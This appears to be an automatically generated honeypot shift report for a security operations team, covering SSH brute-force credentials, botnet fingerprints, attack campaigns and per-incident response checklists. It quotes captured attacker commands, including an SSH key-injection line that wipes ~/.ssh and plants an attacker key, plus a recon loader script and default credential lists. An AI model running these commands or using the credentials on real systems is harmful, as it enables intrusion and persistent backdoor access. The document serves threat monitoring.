# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-31 |
| **Generated At** | 2026-07-31T10:44:28Z |
| **Shift Time** | 10:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **332** |
| Confirmed Threats | **299** |
| False Positives Filtered | **33** (9.9%) |
| Unique Attacker IPs | **138** |
| Countries of Origin | **36** |
| High Severity Cases | **123** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **209** |
| Malware Samples Analyzed | **4** HIGH · **28** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **170** |
| Unique Credential Pairs | **83** |
| Unique Usernames | **22** |
| Unique Passwords | **77** |
| Successful Auth Pairs | **136** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 68 |
| `support` | 21 |
| `admin` | 20 |
| `operator` | 16 |
| `guest` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 14 |
| `` | 9 |
| `support` | 8 |
| `1234567899` | 6 |
| `456321` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 14 |
| `root` | `` | 9 |
| `support` | `support` | 8 |
| `support` | `1234567899` | 6 |
| `root` | `456321` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ftp` | `ftp` | `116.110.17.78` | 2026-07-31T04:56:37 |
| `operator` | `operator` | `171.231.191.101` | 2026-07-31T04:57:30 |
| `nobody` | `nobody6` | `196.188.93.169` | 2026-07-31T04:58:11 |
| `root` | `root777` | `178.178.194.131` | 2026-07-31T04:58:27 |
| `root` | `root777` | `208.109.38.143` | 2026-07-31T04:58:35 |
| `support` | `support` | `10.0.0.73` | 2026-07-31T05:01:13 |
| `support` | `support123456` | `78.187.9.111` | 2026-07-31T05:01:43 |
| `support` | `support123456` | `65.20.149.239` | 2026-07-31T05:01:51 |
| `support` | `support` | `176.53.159.196` | 2026-07-31T05:07:20 |
| `GET http://hy2.buchudui.asia:3333/ HTTP/1.1` | `Host: hy2.buchudui.asia:3333` | `94.154.43.36` | 2026-07-31T05:12:09 |
| `admin` | `admin` | `23.254.222.201` | 2026-07-31T05:13:54 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-31T05:13:55 |
| `support` | `1234567899` | `10.0.0.73` | 2026-07-31T05:14:48 |
| `support` | `1234567899` | `200.232.114.71` | 2026-07-31T05:16:33 |
| `support` | `1234567899` | `14.99.61.248` | 2026-07-31T05:16:42 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.140.177.161` | 2026-07-31T05:17:02 |
| `*1` | `$4` | `34.140.177.161` | 2026-07-31T05:17:16 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5460` | `34.140.177.161` | 2026-07-31T05:17:18 |
| `admin` | `admin88` | `10.0.0.73` | 2026-07-31T05:19:17 |
| `admin` | `admin` | `47.253.5.130` | 2026-07-31T05:21:07 |
| `root` | `1qaz@WSX3edc` | `141.253.107.23` | 2026-07-31T05:30:25 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-31T05:30:40 |
| `supervisor` | `supervisor12345678` | `102.90.34.90` | 2026-07-31T05:31:34 |
| `support` | `1234567899` | `103.174.145.35` | 2026-07-31T05:33:18 |
| `support` | `1234567899` | `118.45.255.153` | 2026-07-31T05:33:27 |
| `root` | `` | `94.154.43.91` | 2026-07-31T05:39:42 |
| `admin` | `12345` | `191.210.73.33` | 2026-07-31T05:42:19 |
| `root` | `root5` | `10.0.0.73` | 2026-07-31T05:51:58 |
| `admin` | `12345` | `10.0.0.73` | 2026-07-31T05:54:20 |
| `root` | `123@@@` | `158.178.141.210` | 2026-07-31T06:01:31 |
| `root` | `LeitboGi0ro` | `158.178.141.210` | 2026-07-31T06:01:31 |
| `root` | `root5` | `220.80.224.223` | 2026-07-31T06:05:09 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `207.175.151.21` | 2026-07-31T06:07:27 |
| `*1` | `$4` | `207.175.151.21` | 2026-07-31T06:07:40 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 3516` | `207.175.151.21` | 2026-07-31T06:07:42 |
| `guest` | `guest10` | `203.129.225.4` | 2026-07-31T06:08:30 |
| `guest` | `guest10` | `63.135.169.175` | 2026-07-31T06:08:37 |
| `guest` | `guest10` | `124.239.129.2` | 2026-07-31T06:08:40 |
| `guest` | `guest10` | `186.179.80.12` | 2026-07-31T06:08:53 |
| `test` | `test333` | `1.247.245.61` | 2026-07-31T06:17:49 |
| `test` | `test333` | `87.117.32.22` | 2026-07-31T06:17:57 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-31T06:24:17 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-31T06:24:18 |
| `root` | `456321` | `10.0.0.73` | 2026-07-31T06:25:16 |
| `guest` | `guest77` | `10.0.0.73` | 2026-07-31T06:25:58 |
| `root` | `456321` | `178.178.194.131` | 2026-07-31T06:26:58 |
| `root` | `456321` | `182.75.197.174` | 2026-07-31T06:27:06 |
| `test` | `test333` | `10.0.0.73` | 2026-07-31T06:29:51 |
| `admin` | `admin` | `118.26.111.107` | 2026-07-31T06:30:13 |
| `root` | `456321` | `200.105.141.172` | 2026-07-31T06:43:44 |
| `root` | `456321` | `218.4.156.254` | 2026-07-31T06:43:53 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-31T06:50:56 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-31T06:50:57 |
| `root` | `!root` | `80.94.92.179` | 2026-07-31T06:57:21 |
| `support` | `1234qwer` | `10.0.0.73` | 2026-07-31T06:59:21 |
| `root` | `111111` | `80.94.92.179` | 2026-07-31T06:59:48 |
| `root` | `123123` | `80.94.92.179` | 2026-07-31T07:02:52 |
| `support` | `1234qwer` | `178.178.222.60` | 2026-07-31T07:04:32 |
| `support` | `1234qwer` | `196.188.93.169` | 2026-07-31T07:04:44 |
| `guest` | `dietpi` | `10.0.0.73` | 2026-07-31T07:04:55 |
| `root` | `123321` | `80.94.92.179` | 2026-07-31T07:05:37 |
| `root` | `1234` | `80.94.92.179` | 2026-07-31T07:08:18 |
| `root` | `---fuck_you----` | `111.45.29.88` | 2026-07-31T07:08:33 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-31T07:09:17 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-31T07:09:18 |
| `root` | `12345` | `80.94.92.179` | 2026-07-31T07:10:41 |
| `support` | `1234qwer` | `103.68.52.210` | 2026-07-31T07:12:44 |
| `pgadmin` | `pgadmin123` | `91.134.138.62` | 2026-07-31T07:15:05 |
| `345gs5662d34` | `345gs5662d34` | `91.134.138.62` | 2026-07-31T07:15:07 |
| `pgadmin` | `3245gs5662d34` | `91.134.138.62` | 2026-07-31T07:15:08 |
| `root` | `1234567` | `80.94.92.179` | 2026-07-31T07:15:19 |
| `root` | `12345678` | `80.94.92.179` | 2026-07-31T07:17:21 |
| `default` | `techsupport` | `119.152.102.54` | 2026-07-31T07:18:53 |
| `admin` | `firewall` | `34.146.217.105` | 2026-07-31T07:19:14 |
| `root` | `123456789` | `80.94.92.179` | 2026-07-31T07:21:03 |
| `guest` | `dietpi` | `179.185.1.97` | 2026-07-31T07:22:58 |
| `guest` | `dietpi` | `106.89.60.76` | 2026-07-31T07:23:08 |
| `root` | `1234567890` | `80.94.92.179` | 2026-07-31T07:24:15 |
| `postgres` | `1234567890` | `107.189.27.179` | 2026-07-31T07:25:04 |
| `345gs5662d34` | `345gs5662d34` | `107.189.27.179` | 2026-07-31T07:25:07 |
| `postgres` | `3245gs5662d34` | `107.189.27.179` | 2026-07-31T07:25:07 |
| `admin` | `admin` | `47.236.161.139` | 2026-07-31T07:26:05 |
| `tester1` | `123456` | `14.103.117.86` | 2026-07-31T07:26:20 |
| `root` | `123456a` | `80.94.92.179` | 2026-07-31T07:26:25 |
| `operator` | `654321` | `110.227.215.90` | 2026-07-31T07:28:25 |
| `operator` | `654321` | `218.248.19.102` | 2026-07-31T07:28:37 |
| `root` | `123456b` | `80.94.92.179` | 2026-07-31T07:28:46 |
| `tomcat` | `tomcat` | `92.5.66.49` | 2026-07-31T07:29:07 |
| `root` | `1234abcd` | `80.94.92.179` | 2026-07-31T07:31:01 |
| `root` | `123abc` | `80.94.92.179` | 2026-07-31T07:33:11 |
| `root` | `abcd1234` | `10.0.0.73` | 2026-07-31T07:35:00 |
| `root` | `123qwe` | `80.94.92.179` | 2026-07-31T07:35:13 |
| `admin` | `admin77` | `10.0.0.73` | 2026-07-31T07:36:01 |
| `operator` | `operator66` | `117.39.63.46` | 2026-07-31T07:38:25 |
| `operator` | `operator66` | `14.23.77.27` | 2026-07-31T07:38:37 |
| `root` | `1q2w3e4r` | `80.94.92.179` | 2026-07-31T07:39:03 |
| `root` | `1qaz2wsx` | `80.94.92.179` | 2026-07-31T07:42:44 |
| `root` | `1qaz@WSX` | `80.94.92.179` | 2026-07-31T07:45:20 |
| `operator` | `operator66` | `200.89.159.59` | 2026-07-31T07:46:13 |
| `operator` | `operator66` | `201.63.52.54` | 2026-07-31T07:46:21 |
| `root` | `21` | `80.94.92.179` | 2026-07-31T07:47:59 |
| `root` | `321` | `80.94.92.179` | 2026-07-31T07:50:15 |
| `root` | `4321` | `80.94.92.179` | 2026-07-31T07:52:44 |
| `root` | `54321` | `80.94.92.179` | 2026-07-31T08:00:24 |
| `b'\x16\x03\x03\x02c\x01\x00\x02_\x03\x03\r\xa8!\xb42\x9fdS\x80\xddy\xca\xf4\x8ap\x0c\xbe\x1f0\xcf\xdf2}s\x03\xcc\xce\xdf\x02z*B \x8a\x9d\xc8\x08\xdb:\xb4k\x06K\xf2\xcb\xac\xd9\xd8q\xb2)>-\xf6\xaa4\xe9\x16\x93Ba\xe3\xeas\xb0\x00\x8a\x00\x16\x003\x00g\xc0\x9e\xc0\xa2\x00\x9e\x009\x00k\xc0\x9f\xc0\xa3\x00\x9f\x00E\x00\xbe\x00\x88\x00\xc4\x00\x9a\xc0\x08\xc0\t\xc0#\xc0\xac\xc0\xae\xc0+\xc0'` | `b"\xc0$\xc0\xad\xc0\xaf\xc0,\xc0r\xc0s\xcc\xa9\x13\x02\x13\x01\xcc\x14\xc0\x07\xc0\x12\xc0\x13\xc0'\xc0/\xc0\x14\xc0(\xc00\xc0`\xc0a\xc0v\xc0w\xcc\xa8\x13\x05\x13\x04\x13\x03\xcc\x13\xc0\x11\x00"` | `195.184.76.213` | 2026-07-31T08:01:17 |
| `b'\x00/\x00<\xc0\x9c\xc0\xa0\x00\x9c\x005\x00=\xc0\x9d\xc0\xa1\x00\x9d\x00A\x00\xba\x00\x84\x00\xc0\x00\x07\x00\x04\x00\x05\x01\x00\x01\x8c\x00\x00\x00\x13\x00\x11\x00\x00\x0e129.80.119.236\x00\x0b\x00\x04\x03\x00\x01\x02\x00'` | `  ` | `195.184.76.213` | 2026-07-31T08:01:17 |
| `root` | `555555` | `80.94.92.179` | 2026-07-31T08:04:47 |
| `root` | `159753` | `10.0.0.73` | 2026-07-31T08:06:29 |
| `root` | `654321` | `80.94.92.179` | 2026-07-31T08:07:41 |
| `linaro` | `linaro` | `10.0.0.73` | 2026-07-31T08:09:58 |
| `root` | `7777777` | `80.94.92.179` | 2026-07-31T08:11:55 |
| `operator` | `1q2w3e` | `186.235.193.170` | 2026-07-31T08:12:40 |
| `operator` | `1q2w3e` | `58.34.174.90` | 2026-07-31T08:12:50 |
| `operator` | `password123` | `10.0.0.73` | 2026-07-31T08:15:31 |
| `root` | `Admin2026!` | `80.94.92.179` | 2026-07-31T08:19:23 |
| `root` | `P4ssw0rd` | `80.94.92.179` | 2026-07-31T08:23:20 |
| `root` | `P4ssword` | `80.94.92.179` | 2026-07-31T08:25:45 |
| `linaro` | `linaro` | `59.48.40.6` | 2026-07-31T08:29:19 |
| `linaro` | `linaro` | `176.36.139.231` | 2026-07-31T08:29:29 |
| `operator` | `1q2w3e` | `218.248.19.102` | 2026-07-31T08:29:33 |
| `linaro` | `linaro` | `218.25.233.22` | 2026-07-31T08:29:37 |
| `root` | `P@ssw0rd` | `80.94.92.179` | 2026-07-31T08:31:28 |
| `operator` | `password123` | `213.234.9.218` | 2026-07-31T08:33:19 |
| `operator` | `password123` | `49.124.152.234` | 2026-07-31T08:33:32 |
| `supervisor` | `3333333333` | `65.20.211.96` | 2026-07-31T08:38:55 |
| `default` | `1q2w3e4r` | `10.0.0.73` | 2026-07-31T08:40:33 |
| `root` | `P@ssw0rd2026` | `80.94.92.179` | 2026-07-31T08:41:17 |
| `root` | `P@ssword` | `80.94.92.179` | 2026-07-31T08:44:37 |
| `operator` | `Password` | `10.0.0.73` | 2026-07-31T08:45:19 |
| `default` | `1q2w3e4r` | `219.128.15.190` | 2026-07-31T08:45:40 |
| `default` | `1q2w3e4r` | `216.232.226.40` | 2026-07-31T08:45:49 |
| `root` | `930920` | `10.0.0.73` | 2026-07-31T08:46:19 |
| `root` | `930920` | `222.75.225.206` | 2026-07-31T08:48:03 |
| `root` | `930920` | `188.219.104.210` | 2026-07-31T08:48:11 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-31T08:50:08 |
| `default` | `1q2w3e4r` | `223.197.145.33` | 2026-07-31T08:53:27 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **332** |
| Sessions with Fingerprint | **18** |
| Unique HASSH Fingerprints | **18** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 52 |
| OpenSSH | 49 |
| libssh | 23 |
| Paramiko (Python) | 8 |
| AsyncSSH (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 49 | 46 |
| `2ec37a7cc8da...` | Mirai/variant | 32 | 1 |
| `f555226df196...` | Mirai/variant | 8 | 3 |
| `a2de0f306611...` | Mirai/variant | 6 | 3 |
| `19532158b559...` | Mirai/variant | 4 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 49 | 46 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 32 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 3 | — |
| `f555226df196...` | libssh | 8 | 3 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 6 | 3 | Mirai/variant |
| `19532158b559...` | libssh | 4 | 4 | Mirai/variant |
| `5f904648ee89...` | Go SSH scanner | 4 | 1 | Generic scanner |
| `16443846184e...` | Go SSH scanner | 4 | 3 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 31 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.179`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.91`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `107.189.27.179`, `91.134.138.62`, `14.103.117.86`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **138** |
| Unique ASNs | **85** |
| High-Risk ASNs | **69** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 12 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 10 | HIGH |
| `AS396982` | Google LLC | 6 | HIGH |
| `AS31898` | Oracle Corporation | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS213412` | ONYPHE SAS | 4 | LOW |
| `AS0` |  | 3 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (122)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b030c92886d2

| Field | Detail |
|---|---|
| **Source IP** | `116.110.17[.]78` |
| **First Seen** | 2026-07-31 04:56 |
| **Last Seen** | 2026-07-31 04:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 04:56:29` | `cowrie.session.connect` |
| `2026-07-31 04:56:29` | `cowrie.client.version` |
| `2026-07-31 04:56:31` | `cowrie.client.kex` |
| `2026-07-31 04:56:37` | `cowrie.login.success` |
| `2026-07-31 04:56:38` | `cowrie.direct-tcpip.request` |
| `2026-07-31 04:56:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-31 04:56:38` | `cowrie.direct-tcpip.data` |
| `2026-07-31 04:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.17[.]78` to AbuseIPDB if not already reported
- [ ] Block `116.110.17[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d32ca1e19bd5

| Field | Detail |
|---|---|
| **Source IP** | `171.231.191[.]101` |
| **First Seen** | 2026-07-31 04:57 |
| **Last Seen** | 2026-07-31 04:57 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 04:57:16` | `cowrie.session.connect` |
| `2026-07-31 04:57:16` | `cowrie.client.version` |
| `2026-07-31 04:57:28` | `cowrie.client.kex` |
| `2026-07-31 04:57:30` | `cowrie.login.success` |
| `2026-07-31 04:57:30` | `cowrie.direct-tcpip.request` |
| `2026-07-31 04:57:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-31 04:57:31` | `cowrie.direct-tcpip.data` |
| `2026-07-31 04:57:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.191[.]101` to AbuseIPDB if not already reported
- [ ] Block `171.231.191[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cecfb080e0b

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-31 04:58 |
| **Last Seen** | 2026-07-31 04:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 04:58:09` | `cowrie.session.connect` |
| `2026-07-31 04:58:10` | `cowrie.client.version` |
| `2026-07-31 04:58:10` | `cowrie.client.kex` |
| `2026-07-31 04:58:11` | `cowrie.login.success` |
| `2026-07-31 04:58:12` | `cowrie.direct-tcpip.request` |
| `2026-07-31 04:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47f265fa2f69

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-07-31 04:58 |
| **Last Seen** | 2026-07-31 04:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 04:58:26` | `cowrie.session.connect` |
| `2026-07-31 04:58:26` | `cowrie.client.version` |
| `2026-07-31 04:58:26` | `cowrie.client.kex` |
| `2026-07-31 04:58:27` | `cowrie.login.success` |
| `2026-07-31 04:58:28` | `cowrie.direct-tcpip.request` |
| `2026-07-31 04:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fadea28aa5e5

| Field | Detail |
|---|---|
| **Source IP** | `208.109.38[.]143` |
| **First Seen** | 2026-07-31 04:58 |
| **Last Seen** | 2026-07-31 04:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 04:58:33` | `cowrie.session.connect` |
| `2026-07-31 04:58:33` | `cowrie.client.version` |
| `2026-07-31 04:58:33` | `cowrie.client.kex` |
| `2026-07-31 04:58:35` | `cowrie.login.success` |
| `2026-07-31 04:58:35` | `cowrie.direct-tcpip.request` |
| `2026-07-31 04:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.109.38[.]143` to AbuseIPDB if not already reported
- [ ] Block `208.109.38[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f7e87d79cc0

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]111` |
| **First Seen** | 2026-07-31 05:01 |
| **Last Seen** | 2026-07-31 05:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:01:41` | `cowrie.session.connect` |
| `2026-07-31 05:01:42` | `cowrie.client.version` |
| `2026-07-31 05:01:42` | `cowrie.client.kex` |
| `2026-07-31 05:01:43` | `cowrie.login.success` |
| `2026-07-31 05:01:44` | `cowrie.direct-tcpip.request` |
| `2026-07-31 05:01:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]111` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b206db877e69

| Field | Detail |
|---|---|
| **Source IP** | `65.20.149[.]239` |
| **First Seen** | 2026-07-31 05:01 |
| **Last Seen** | 2026-07-31 05:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:01:49` | `cowrie.session.connect` |
| `2026-07-31 05:01:49` | `cowrie.client.version` |
| `2026-07-31 05:01:49` | `cowrie.client.kex` |
| `2026-07-31 05:01:51` | `cowrie.login.success` |
| `2026-07-31 05:01:51` | `cowrie.direct-tcpip.request` |
| `2026-07-31 05:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.149[.]239` to AbuseIPDB if not already reported
- [ ] Block `65.20.149[.]239` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c5d566961f6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-31 05:07 |
| **Last Seen** | 2026-07-31 05:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:07:20` | `cowrie.session.connect` |
| `2026-07-31 05:07:20` | `cowrie.client.version` |
| `2026-07-31 05:07:20` | `cowrie.client.kex` |
| `2026-07-31 05:07:20` | `cowrie.login.success` |
| `2026-07-31 05:07:21` | `cowrie.direct-tcpip.request` |
| `2026-07-31 05:07:21` | `cowrie.direct-tcpip.data` |
| `2026-07-31 05:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c294327685c

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]36` |
| **First Seen** | 2026-07-31 05:12 |
| **Last Seen** | 2026-07-31 05:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36, Accept: */*, Connection: close, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:12:09` | `cowrie.session.connect` |
| `2026-07-31 05:12:09` | `cowrie.login.success` |
| `2026-07-31 05:12:10` | `cowrie.session.params` |
| `2026-07-31 05:12:10` | `cowrie.command.input` |
| `2026-07-31 05:12:10` | `cowrie.command.input` |
| `2026-07-31 05:12:10` | `cowrie.command.failed` |
| `2026-07-31 05:12:10` | `cowrie.command.input` |
| `2026-07-31 05:12:10` | `cowrie.command.failed` |
| `2026-07-31 05:12:10` | `cowrie.command.input` |
| `2026-07-31 05:12:10` | `cowrie.command.failed` |
| `2026-07-31 05:12:10` | `cowrie.command.input` |
| `2026-07-31 05:12:10` | `cowrie.log.closed` |
